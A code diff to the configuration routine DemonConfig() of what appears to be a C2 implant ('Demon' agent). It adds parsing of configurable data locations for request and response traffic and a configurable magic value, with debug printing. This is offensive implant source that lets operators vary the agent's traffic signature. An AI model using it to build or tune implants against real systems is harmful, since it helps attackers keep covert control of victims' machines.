@@ -761,6 +761,48 @@ VOID DemonConfig()
     {
         PUTS( "[CONFIG] [PROXY] Disabled" );
     }
+
+    // data location config (request direction)
+    Instance->Config.Transport.DataReq.Location = ParserGetInt32( &Parser );
+    Buffer = ParserGetBytes( &Parser, &Length );
+    if ( Length > 0 )
+    {
+        Instance->Config.Transport.DataReq.Name = MmHeapAlloc( Length + sizeof( WCHAR ) );
+        MemCopy( Instance->Config.Transport.DataReq.Name, Buffer, Length );
+    }
+    else
+    {
+        Instance->Config.Transport.DataReq.Name = NULL;
+    }
+
+    // data location config (response direction)
+    Instance->Config.Transport.DataResp.Location = ParserGetInt32( &Parser );
+    Buffer = ParserGetBytes( &Parser, &Length );
+    if ( Length > 0 )
+    {
+        Instance->Config.Transport.DataResp.Name = MmHeapAlloc( Length + sizeof( WCHAR ) );
+        MemCopy( Instance->Config.Transport.DataResp.Name, Buffer, Length );
+    }
+    else
+    {
+        Instance->Config.Transport.DataResp.Name = NULL;
+    }
+
+    // read configurable magic value
+    Instance->Config.MagicValue = ParserGetInt32( &Parser );
+    if ( Instance->Config.MagicValue == 0 )
+        Instance->Config.MagicValue = DEMON_MAGIC_VALUE;
+
+    PRINTF(
+        "[CONFIG] DataReq: Location=%d Name=%ls\n"
+        "[CONFIG] DataResp: Location=%d Name=%ls\n"
+        "[CONFIG] MagicValue: 0x%08X\n",
+        Instance->Config.Transport.DataReq.Location,
+        Instance->Config.Transport.DataReq.Name ? Instance->Config.Transport.DataReq.Name : L"(null)",
+        Instance->Config.Transport.DataResp.Location,
+        Instance->Config.Transport.DataResp.Name ? Instance->Config.Transport.DataResp.Name : L"(null)",
+        Instance->Config.MagicValue
+    )
 #endif
 
 #ifdef TRANSPORT_SMB
